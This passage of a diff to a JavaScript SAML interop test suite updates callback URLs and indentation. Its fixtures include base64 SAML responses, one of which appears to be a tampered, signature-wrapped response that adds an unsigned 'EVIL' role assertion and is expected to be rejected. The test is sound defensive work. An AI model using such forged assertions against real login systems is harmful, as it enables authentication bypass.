TjZLDQphSUtGMG9iZUNiWWkvUVVmOEIrWGkxdFNJSm0xVkNLUkU3bm5saVEvVHpHYU51bGdXZXlUYlZrRzAvWDhMUT09PC9kczpYNTA5Q2VydGlmaWNhdGU+PC9kczpYNTA5RGF0YT48L2RzOktleUluZm8+PC9kczpTaWduYXR1cmU+PHNhbWwyOlN1YmplY3QgeG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPjxzYW1sMjpOYW1lSUQgRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoxLjE6bmFtZWlkLWZvcm1hdDplbWFpbEFkZHJlc3MiPmFkbWluQGtsdWdsYWJzLmNvbTwvc2FtbDI6TmFtZUlEPjxzYW1sMjpTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+PHNhbWwyOlN1YmplY3RDb25maXJtYXRpb25EYXRhIE5vdE9uT3JBZnRlcj0iMjAxMy0wOC0wM1QyMTo1OTo0My45NDJaIiBSZWNpcGllbnQ9Imh0dHBzOi8vYXV0aDAxNDUuYXV0aDAuY29tIi8+PC9zYW1sMjpTdWJqZWN0Q29uZmlybWF0aW9uPjwvc2FtbDI6U3ViamVjdD48c2FtbDI6Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMTMtMDgtMDNUMjE6NDk6NDMuOTQzWiIgTm90T25PckFmdGVyPSIyMDEzLTA4LTAzVDIxOjU5OjQzLjk0MloiIHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj48c2FtbDI6QXVkaWVuY2VSZXN0cmljdGlvbj48c2FtbDI6QXVkaWVuY2U+aHR0cHM6Ly9hdXRoMDE0NS5hdXRoMC5jb208L3NhbWwyOkF1ZGllbmNlPjwvc2FtbDI6QXVkaWVuY2VSZXN0cmljdGlvbj48L3NhbWwyOkNvbmRpdGlvbnM+PHNhbWwyOkF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAxMy0wOC0wM1QyMTo1NDo0My45NDJaIiBTZXNzaW9uSW5kZXg9ImlkMTM3NTU2Njg4Mzk0Mi42ODc2MTA0MzciIHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj48c2FtbDI6QXV0aG5Db250ZXh0PjxzYW1sMjpBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvc2FtbDI6QXV0aG5Db250ZXh0Q2xhc3NSZWY+PC9zYW1sMjpBdXRobkNvbnRleHQ+PC9zYW1sMjpBdXRoblN0YXRlbWVudD48c2FtbDI6QXR0cmlidXRlU3RhdGVtZW50IHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj48c2FtbDI6QXR0cmlidXRlIE5hbWU9IlJvbGUiIE5hbWVGb3JtYXQ9Im5zIj48c2FtbDI6QXR0cmlidXRlVmFsdWUgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4c2k6dHlwZT0ieHM6c3RyaW5nIj5BZG1pbjwvc2FtbDI6QXR0cmlidXRlVmFsdWU+PC9zYW1sMjpBdHRyaWJ1dGU+PC9zYW1sMjpBdHRyaWJ1dGVTdGF0ZW1lbnQ+PC9zYW1sMjpBc3NlcnRpb24+PGRzOlNpZ25hdHVyZVZhbHVlPlE4ME42RlVyNS9ZUHRFelJsUmRNb1B1K2JMME1zc0R4TlVZK3l4eWt6Ym14c0kwam9Fby9TbW1TZ1pyRFlRS1RsbFprL0tmekJNUEZWOXlCSDQrbUV6Q1U1RTN4dUNzOTlqWnphZmN3M0s4bUlNVEp5MVlIeGpjMzU5ZDI3UjVzNTBpOXc1UEhzdXNSb3YwTWpRSW9KMnc0OEd5NEVuWWFWaXFCUjNVVkVxRT08L2RzOlNpZ25hdHVyZVZhbHVlPjxkczpLZXlJbmZvPjxkczpYNTA5RGF0YT48ZHM6WDUwOUNlcnRpZmljYXRlPk1JSUNuVENDQWdhZ0F3SUJBZ0lHQVVCR0h4cVVNQTBHQ1NxR1NJYjNEUUVCQlFVQU1JR1JNUXN3Q1FZRFZRUUdFd0pWVXpFVE1CRUcNCkExVUVDQXdLUTJGc2FXWnZjbTVwWVRFV01CUUdBMVVFQnd3TlUyRnVJRVp5WVc1amFYTmpiekVOTUFzR0ExVUVDZ3dFVDJ0MFlURVUNCk1CSUdBMVVFQ3d3TFUxTlBVSEp2ZG1sa1pYSXhFakFRQmdOVkJBTU1DV3RzZFdkc1lXSnpNakVjTUJvR0NTcUdTSWIzRFFFSkFSWU4NCmFXNW1iMEJ2YTNSaExtTnZiVEFlRncweE16QTRNRE15TVRNNE16aGFGdzAwTXpBNE1ETXlNVE01TXpoYU1JR1JNUXN3Q1FZRFZRUUcNCkV3SlZVekVUTUJFR0ExVUVDQXdLUTJGc2FXWnZjbTVwWVRFV01CUUdBMVVFQnd3TlUyRnVJRVp5WVc1amFYTmpiekVOTUFzR0ExVUUNCkNnd0VUMnQwWVRFVU1CSUdBMVVFQ3d3TFUxTlBVSEp2ZG1sa1pYSXhFakFRQmdOVkJBTU1DV3RzZFdkc1lXSnpNakVjTUJvR0NTcUcNClNJYjNEUUVKQVJZTmFXNW1iMEJ2YTNSaExtTnZiVENCbnpBTkJna3Foa2lHOXcwQkFRRUZBQU9CalFBd2dZa0NnWUVBc0NCOWxKVEgNCnFCN3ZkTTVqZU9IODRjVzh1N0lIWXY0L09BUFlGMGZCWWU5d0p5MTlDZ3lNMk9naUFTdUFjSXRuSDRXaEIraW8yWlB3Yi9Yd2w3VXUNCjRYbVVFMGwrbWtDTnVEWXA1ZlhUWnh3djVHNkh2a0F4WFppbzBSazlUMFZFVENyb3hncFM1THhRL28vb3dqUjM5Uzd4elJuajZkZFgNCjNNcTJ5R2pLeUJjQ0F3RUFBVEFOQmdrcWhraUc5dzBCQVFVRkFBT0JnUUFCMXFHTnFTTkxMV3ErUlBjUCt3T2FXdFlwSk9KOC9NYloNCkVXV205L0tLSEtYTTZKL3pnVVVJWFppM2N6TWVPK1krWDE0UFI4bEdYb0FIZjViL0phdkc5Rm1GdlJuNGZHYTQ1VlRWbzJHZk1ONksNCmFJS0Ywb2JlQ2JZaS9RVWY4QitYaTF0U0lKbTFWQ0tSRTdubmxpUS9UekdhTnVsZ1dleVRiVmtHMC9YOExRPT08L2RzOlg1MDlDZXJ0aWZpY2F0ZT48L2RzOlg1MDlEYXRhPjwvZHM6S2V5SW5mbz48L2RzOlNpZ25hdHVyZT48c2FtbDI6U3ViamVjdCB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI+PHNhbWwyOk5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjEuMTpuYW1laWQtZm9ybWF0OmVtYWlsQWRkcmVzcyI+YWRtaW5Aa2x1Z2xhYnMuY29tPC9zYW1sMjpOYW1lSUQ+PHNhbWwyOlN1YmplY3RDb25maXJtYXRpb24gTWV0aG9kPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y206YmVhcmVyIj48c2FtbDI6U3ViamVjdENvbmZpcm1hdGlvbkRhdGEgTm90T25PckFmdGVyPSIyMDEzLTA4LTAzVDIxOjU5OjQzLjk0MloiIFJlY2lwaWVudD0iaHR0cHM6Ly9hdXRoMDE0NS5hdXRoMC5jb20iLz48L3NhbWwyOlN1YmplY3RDb25maXJtYXRpb24+PC9zYW1sMjpTdWJqZWN0PjxzYW1sMjpDb25kaXRpb25zIE5vdEJlZm9yZT0iMjAxMy0wOC0wM1QyMTo0OTo0My45NDNaIiBOb3RPbk9yQWZ0ZXI9IjIwMTMtMDgtMDNUMjE6NTk6NDMuOTQyWiIgeG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPjxzYW1sMjpBdWRpZW5jZVJlc3RyaWN0aW9uPjxzYW1sMjpBdWRpZW5jZT5odHRwczovL2F1dGgwMTQ1LmF1dGgwLmNvbTwvc2FtbDI6QXVkaWVuY2U+PC9zYW1sMjpBdWRpZW5jZVJlc3RyaWN0aW9uPjwvc2FtbDI6Q29uZGl0aW9ucz48c2FtbDI6QXV0aG5TdGF0ZW1lbnQgQXV0aG5JbnN0YW50PSIyMDEzLTA4LTAzVDIxOjU0OjQzLjk0MloiIFNlc3Npb25JbmRleD0iaWQxMzc1NTY2ODgzOTQyLjY4NzYxMDQzNyIgeG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPjxzYW1sMjpBdXRobkNvbnRleHQ+PHNhbWwyOkF1dGhuQ29udGV4dENsYXNzUmVmPnVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphYzpjbGFzc2VzOlBhc3N3b3JkUHJvdGVjdGVkVHJhbnNwb3J0PC9zYW1sMjpBdXRobkNvbnRleHRDbGFzc1JlZj48L3NhbWwyOkF1dGhuQ29udGV4dD48L3NhbWwyOkF1dGhuU3RhdGVtZW50PjxzYW1sMjpBdHRyaWJ1dGVTdGF0ZW1lbnQgeG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPjxzYW1sMjpBdHRyaWJ1dGUgTmFtZT0iUm9sZSIgTmFtZUZvcm1hdD0ibnMiPjxzYW1sMjpBdHRyaWJ1dGVWYWx1ZSB4bWxuczp4cz0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEiIHhtbG5zOnhzaT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEtaW5zdGFuY2UiIHhzaTp0eXBlPSJ4czpzdHJpbmciPkVWSUw8L3NhbWwyOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDI6QXR0cmlidXRlPjwvc2FtbDI6QXR0cmlidXRlU3RhdGVtZW50Pjwvc2FtbDI6QXNzZXJ0aW9uPjwvc2FtbDJwOlJlc3BvbnNlPg==' }\n       }, function(err, response) {\n         if(err) return done(err);\n\n@@ -135,7 +135,7 @@\ndescribe('interop', function () {\n \n     it('should return error', function(){\n       expect(r.statusCode)\n-            .to.equal(400);\n+          .to.equal(400);\n     });\n   });\n\n@@ -146,7 +146,7 @@\ndescribe('interop', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback',\n+        uri: `${server.BASE_URL}/callback`,\n         form: { SAMLResponse: SAMLResponse }\n       }, function(err, response) {\n         if(err) return done(err);\n\n@@ -156,9 +156,8 @@\ndescribe('interop', function () {\n     });\n \n     it('should return error', function(){\n-      console.log({ body: r.body });\n       expect(r.statusCode)\n-            .to.equal(400);\n+          .to.equal(400);\n     });\n   });\n\n@@ -169,7 +168,7 @@\ndescribe('interop', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback/samlp-ping',\n+        uri: `${server.BASE_URL}/callback/samlp-ping`,\n         form: { SAMLResponse: 'PHNhbWxwOlJlc3BvbnNlIERlc3RpbmF0aW9uPSJodHRwczovL2xvZ2luLWRldjMuYXV0aDAuY29tOjMwMDAvbG9naW4vY2FsbGJhY2siIEluUmVzcG9uc2VUbz0iXzRhNDMyMzEzNmNhMGFkNDU3OGNiIiBJc3N1ZUluc3RhbnQ9IjIwMTMtMDctMDhUMTk6NDA6MjUuNTIxWiIgSUQ9IklEMzBlNjM2OTcyYzgxYmNkN2E1MzBkMWJkNjc4MmM4YmNiZTU2Y2U4NjEwZDM0ZDJjMDIiIFZlcnNpb249IjIuMCIgeG1sbnM6c2FtbHA9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpwcm90b2NvbCI+PHNhbWw6SXNzdWVyIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPlBpbmdDb25uZWN0PC9zYW1sOklzc3Vlcj48c2FtbHA6U3RhdHVzPjxzYW1scDpTdGF0dXNDb2RlIFZhbHVlPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6c3RhdHVzOlN1Y2Nlc3MiLz48L3NhbWxwOlN0YXR1cz48c2FtbDpBc3NlcnRpb24gVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMTMtMDctMDhUMTk6NDA6MjUuNTIxWiIgSUQ9IklENzc1MzVlNjc2YjM0ZDQyNzAzMWM3NTM5ODk2Nzg5YzE5NTM4ZTdlNmRmNTY5YWQ4MDIiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPjxzYW1sOklzc3Vlcj5QaW5nQ29ubmVjdDwvc2FtbDpJc3N1ZXI+PGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+CjxkczpTaWduZWRJbmZvPgo8ZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPgo8ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI3JzYS1zaGExIi8+CjxkczpSZWZlcmVuY2UgVVJJPSIjSUQ3NzUzNWU2NzZiMzRkNDI3MDMxYzc1Mzk4OTY3ODljMTk1MzhlN2U2ZGY1NjlhZDgwMiI+CjxkczpUcmFuc2Zvcm1zPgo8ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI2VudmVsb3BlZC1zaWduYXR1cmUiLz4KPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPgo8L2RzOlRyYW5zZm9ybXM+CjxkczpEaWdlc3RNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjc2hhMSIvPgo8ZHM6RGlnZXN0VmFsdWU+elRZdENWTVpBUDJYZGFJRDM3VlMyZ1MrTEwwPTwvZHM6RGlnZXN0VmFsdWU+CjwvZHM6UmVmZXJlbmNlPgo8L2RzOlNpZ25lZEluZm8+CjxkczpTaWduYXR1cmVWYWx1ZT4KUUNaRGtMMXRzZzFISDNtQVd3UDJzYWlRVFNldTBsTTdmdXNCQmlsL3RDdGpkU2xlZXgra1JETFpvY2p1SytVcDEvN0poS0NOVVE2SApOcVd0cWZHVVJpcUpaKzI5UVoxdzZibU93YXVzZzFiUkJGb0VtUkd0cER4dTBwNHNXemlOdzJ0eU81b1ZWSDYwaEFmZllHTjcweUg0CkUxd2t1emVhRVhOWFhGaEFKeHNOVGo1SkdEZmNld1U5UjQvVW1yTlVYWTdrdkJRV3BRcmI1VE5TNjNrL0hhaEdsN3pPNzJla1FVK04KU0FUU0Eyb2hJU09obVBTbUVyQVVaQkI2Z0FSQ2srT2xWRld0VS9NUnFFMlo5UWFXNndkYlBnVkg0d2JYbnA4YkcxdTQ0VHk5bUFDWApiKzhXT0F3NHBYTkxXYzVZK2dKaVFyaUdyb3p6b0pQaDVGL3FDZz09CjwvZHM6U2lnbmF0dXJlVmFsdWU+CjxkczpLZXlJbmZvPgo8ZHM6WDUwOURhdGE+CjxkczpYNTA5Q2VydGlmaWNhdGU+Ck1JSUZ4akNDQks2Z0F3SUJBZ0lRYXFiblNYTklDQWRmVFo4Sm9pcU9VakFOQmdrcWhraUc5dzBCQVFVRkFEQmlNUXN3Q1FZRFZRUUcKRXdKVlV6RWhNQjhHQTFVRUNoTVlUbVYwZDI5eWF5QlRiMngxZEdsdmJuTWdUQzVNTGtNdU1UQXdMZ1lEVlFRREV5ZE9aWFIzYjNKcgpJRk52YkhWMGFXOXVjeUJEWlhKMGFXWnBZMkYwWlNCQmRYUm9iM0pwZEhrd0hoY05NVEl3TXpBeU1EQXdNREF3V2hjTk1UUXdPREk0Ck1qTTFPVFU1V2pDQnp6RUxNQWtHQTFVRUJoTUNWVk14RGpBTUJnTlZCQkVUQlRnd01qQXlNUXN3Q1FZRFZRUUlFd0pEVHpFUE1BMEcKQTFVRUJ4TUdSR1Z1ZG1WeU1SSXdFQVlEVlFRSkV3bFRkV2wwWlNBeE1EQXhHVEFYQmdOVkJBa1RFREV3TURFZ01UZDBhQ0JUZEhKbApaWFF4SWpBZ0JnTlZCQW9UR1ZCcGJtY2dTV1JsYm5ScGRIa2dRMjl5Y0c5eVlYUnBiMjR4R0RBV0JnTlZCQXNURDFObFkzVnlaU0JNCmFXNXJJRk5UVERFbE1DTUdBMVVFQXhNY2MzTnZMbU52Ym01bFkzUXVjR2x1WjJsa1pXNTBhWFI1TG1OdmJUQ0NBU0l3RFFZSktvWkkKaHZjTkFRRUJCUUFEZ2dFUEFEQ0NBUW9DZ2dFQkFKZjF1UnZkSTJIdHJtNFNLUTZJd0xtSk9MeXJZdDNvdlJHaUJjejVoLzdmM3BqQwp4UjNYaml1dlVzZjR3T0pVWDAwRzNhcXpvK1o3VGVIRkJPOXA1UnBPWlFwK01tRDFGWko4ZlNUQVZjTDhUZHZKRjFKWUNaZEt3bCtMCk1MS0ZtWnZRMFljR0NOcEVmL1NRRlI1VlJUZzNmekV3eWdMMklsRFpYbXJ6RklBTk04R0JGUFNrZ3JoZitad3lsNnY1TVo2VEhQemUKSlpzMkZnek05MjVkZUNhZDUwMWZJOWtsdnRyRVN6NCtrZUxITEN3TFU2dCtKYW5vMzJneHZLYzNLZ2VyWlJkZ2pEcGI1MVpjRE10WQo4dTZBMXVVUGpnSmdPTHkvVFd5NUpXaE4vQmlwQkNGWEFXRTZCRDdKb3lmUEJTTjlRaE51cWR2WHM3NVhyRmxmNUk4Q0F3RUFBYU9DCkFnZ3dnZ0lFTUI4R0ExVWRJd1FZTUJhQUZEeEI0bzhJQ0tsTUpZbU5iY1U0MFB5RmpHSVhNQjBHQTFVZERnUVdCQlRRdHNIWU0wU0UKK0JwUGdUcUFudDhtb05CeHp6QU9CZ05WSFE4QkFmOEVCQU1DQmFBd0RBWURWUjBUQVFIL0JBSXdBREFkQmdOVkhTVUVGakFVQmdncgpCZ0VGQlFjREFRWUlLd1lCQlFVSEF3SXdhd1lEVlIwZ0JHUXdZakJnQmd3ckJnRUVBWVlPQVFJQkF3RXdVREJPQmdnckJnRUZCUWNDCkFSWkNhSFIwY0RvdkwzZDNkeTV1WlhSM2IzSnJjMjlzZFhScGIyNXpMbU52YlM5c1pXZGhiQzlUVTB3dGJHVm5ZV3d0Y21Wd2IzTnAKZEc5eWVTMWpjSE11YW5Od01Ib0dBMVVkSHdSek1IRXdOcUEwb0RLR01HaDBkSEE2THk5amNtd3VibVYwYzI5c2MzTnNMbU52YlM5TwpaWFIzYjNKclUyOXNkWFJwYjI1elgwTkJMbU55YkRBM29EV2dNNFl4YUhSMGNEb3ZMMk55YkRJdWJtVjBjMjlzYzNOc0xtTnZiUzlPClpYUjNiM0pyVTI5c2RYUnBiMjV6WDBOQkxtTnliREJ6QmdnckJnRUZCUWNCQVFSbk1HVXdQQVlJS3dZQkJRVUhNQUtHTUdoMGRIQTYKTHk5M2QzY3VibVYwYzI5c2MzTnNMbU52YlM5T1pYUjNiM0pyVTI5c2RYUnBiMjV6WDBOQkxtTnlkREFsQmdnckJnRUZCUWN3QVlZWgphSFIwY0RvdkwyOWpjM0F1Ym1WMGMyOXNjM05zTG1OdmJUQW5CZ05WSFJFRUlEQWVnaHh6YzI4dVkyOXVibVZqZEM1d2FXNW5hV1JsCmJuUnBkSGt1WTI5dE1BMEdDU3FHU0liM0RRRUJCUVVBQTRJQkFRQ0h1elNEaHg0Ukd5N1JiQ0FJMG1maWR2bXR6ZmFMVm9LaUIzVFoKSlVmNmpreXF5NmN3bjA5bjQxdW1kdUpZRHU4K2p2ODFKZUxXdGpabWxYZmhzb3ZhQlRJRVd4aUkxTlFLNlY5Rjk3ZDM3bHF5c3ZJbQprSUliaFVKaEJvSW5ZUldLM1dxYXd6V295Vjh2eFAxaDdNam81c1BOZ3FmTnNVVm5iOVBJODA0bFg3UEZZSHJxS0tudXJxb09kTHJvCnpGU2pBeUU0NElFNWdHWWVqN05SbE5EY1VRcEZ3Yjd6MkJqTVJtQ3RReTA2VlRjSFVlZDdNcWc5WHNNVHA4WXlDbW9uWkFlTGpXYTkKZnFDcVFJZzZvT3BTNzhKeXN4bGVFM3YvUWtYd0tmdGwzZGFiT2dwL1hDMzF6VW1MRDhqTzZLYmRpTzhrQ1B1TFFIUEl2c0ZvYXRDSQo8L2RzOlg1MDlDZXJ0aWZpY2F0ZT4KPC9kczpYNTA5RGF0YT4KPGRzOktleVZhbHVlPgo8ZHM6UlNBS2V5VmFsdWU+CjxkczpNb2R1bHVzPgpsL1c1RzkwalllMnViaElwRG9qQXVZazR2S3RpM2VpOUVhSUZ6UG1IL3QvZW1NTEZIZGVPSzY5U3gvakE0bFJmVFFiZHFyT2o1bnROCjRjVUU3Mm5sR2s1bENuNHlZUFVWa254OUpNQlZ3dnhOMjhrWFVsZ0psMHJDWDRzd3NvV1ptOURSaHdZSTJrUi85SkFWSGxWRk9EZC8KTVRES0F2WWlVTmxlYXZNVWdBMHp3WUVVOUtTQ3VGLzVuREtYcS9reG5wTWMvTjRsbXpZV0RNejNibDE0SnAzblRWOGoyU1crMnNSTApQajZSNHNjc0xBdFRxMzRscWVqZmFERzhwemNxQjZ0bEYyQ01PbHZuVmx3TXkxank3b0RXNVErT0FtQTR2TDlOYkxrbGFFMzhHS2tFCklWY0JZVG9FUHNtako4OEZJMzFDRTI2cDI5ZXp2bGVzV1Yva2p3PT0KPC9kczpNb2R1bHVzPgo8ZHM6RXhwb25lbnQ+QVFBQjwvZHM6RXhwb25lbnQ+CjwvZHM6UlNBS2V5VmFsdWU+CjwvZHM6S2V5VmFsdWU+CjwvZHM6S2V5SW5mbz4KPC9kczpTaWduYXR1cmU+PHNhbWw6U3ViamVjdD48c2FtbDpOYW1lSUQgRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoxLjE6bmFtZWlkLWZvcm1hdDplbWFpbEFkZHJlc3MiPnRlc3R1c2VyMUB0ZXN0aWRwLmNvbm5lY3QucGluZ2lkZW50aXR5LmNvbTwvc2FtbDpOYW1lSUQ+PHNhbWw6U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxzYW1sOlN1YmplY3RDb25maXJtYXRpb25EYXRhIEluUmVzcG9uc2VUbz0iXzRhNDMyMzEzNmNhMGFkNDU3OGNiIiBOb3RPbk9yQWZ0ZXI9IjIwMTMtMDctMDhUMjA6MTA6MjUuNTIxWiIgUmVjaXBpZW50PSJodHRwczovL2xvZ2luLWRldjMuYXV0aDAuY29tOjMwMDAvbG9naW4vY2FsbGJhY2siLz48L3NhbWw6U3ViamVjdENvbmZpcm1hdGlvbj48L3NhbWw6U3ViamVjdD48c2FtbDpDb25kaXRpb25zIE5vdE9uT3JBZnRlcj0iMjAxMy0wNy0wOFQyMDoxMDoyNS41MjFaIiBOb3RCZWZvcmU9IjIwMTMtMDctMDhUMTk6MzA6MjUuNTIxWiI+PHNhbWw6QXVkaWVuY2VSZXN0cmljdGlvbj48c2FtbDpBdWRpZW5jZT51cm46YXV0aDA6bG9naW4tZGV2Mzwvc2FtbDpBdWRpZW5jZT48L3NhbWw6QXVkaWVuY2VSZXN0cmljdGlvbj48L3NhbWw6Q29uZGl0aW9ucz48c2FtbDpBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMTMtMDctMDhUMTk6NDA6MjUuNTIyWiIgU2Vzc2lvbkluZGV4PSJsTGJTYlhpZmFPREx3T2hCZ1AyZk5PdVc5RmoiPjxzYW1sOkF1dGhuQ29udGV4dD48c2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZDwvc2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj48c2FtbDpBdXRoZW50aWNhdGluZ0F1dGhvcml0eT50ZXN0aWRwLmNvbm5lY3QucGluZ2lkZW50aXR5LmNvbTwvc2FtbDpBdXRoZW50aWNhdGluZ0F1dGhvcml0eT48L3NhbWw6QXV0aG5Db250ZXh0Pjwvc2FtbDpBdXRoblN0YXRlbWVudD48c2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj48c2FtbDpBdHRyaWJ1dGUgTmFtZUZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmF0dHJuYW1lLWZvcm1hdDpiYXNpYyIgTmFtZT0iUGluZ09uZS5pZHBpZCI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyIgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSI+YjE0ZWIwYjYtYTMzYS00MTRkLTljNzctMDEzMWUzMjRhNWI3PC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU+PHNhbWw6QXR0cmlidXRlIE5hbWVGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphdHRybmFtZS1mb3JtYXQ6YmFzaWMiIE5hbWU9Im5hbWVpZCI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyIgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSI+dGVzdF9uYW1laWQ8L3NhbWw6QXR0cmlidXRlVmFsdWU+PC9zYW1sOkF0dHJpYnV0ZT48c2FtbDpBdHRyaWJ1dGUgTmFtZUZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmF0dHJuYW1lLWZvcm1hdDpiYXNpYyIgTmFtZT0iUGluZ09uZS5BdXRoZW50aWNhdGluZ0F1dGhvcml0eSI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyIgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSI+dGVzdGlkcC5jb25uZWN0LnBpbmdpZGVudGl0eS5jb208L3NhbWw6QXR0cmlidXRlVmFsdWU+PC9zYW1sOkF0dHJpYnV0ZT48L3NhbWw6QXR0cmlidXRlU3RhdGVtZW50Pjwvc2FtbDpBc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4=' }\n       }, function(err, response, body) {\n         if(err) return done(err);\n\n@@ -182,7 +181,7 @@\ndescribe('interop', function () {\n \n     it('should validate response and not signature', function(){\n       expect(r.statusCode)\n-            .to.equal(200);\n+          .to.equal(200);\n     });\n \n     it('should return a valid user', function(){\n\n@@ -195,10 +194,10 @@\ndescribe('interop', function () {\n     var signedAssertion = '<saml:Assertion MajorVersion=\"1\" MinorVersion=\"1\" AssertionID=\"_8c8a1b2e-7ed4-4b32-82ce-83c6d72bb297\" Issuer=\"https://test-adfs.auth0.com\" IssueInstant=\"2013-07-11T12:32:02.990Z\" xmlns:saml=\"urn:oasis:names:tc:SAML:1.0:assertion\"><saml:Conditions NotBefore=\"2013-07-11T12:32:02.985Z\" NotOnOrAfter=\"2013-07-11T13:32:02.985Z\"><saml:AudienceRestrictionCondition><saml:Audience>urn:auth0:auth0</saml:Audience></saml:AudienceRestrictionCondition></saml:Conditions><saml:AttributeStatement><saml:Subject><saml:NameIdentifier>john@fabrikam.com</saml:NameIdentifier><saml:SubjectConfirmation><saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod></saml:SubjectConfirmation></saml:Subject><saml:Attribute AttributeName=\"emailaddress\" AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\"><saml:AttributeValue>john@fabrikam.com</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeName=\"name\" AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\"><saml:AttributeValue>John Fabrikam</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeName=\"givenname\" AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\"><saml:AttributeValue>John</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeName=\"surname\" AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\"><saml:AttributeValue>Fabrikam</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthenticationStatement 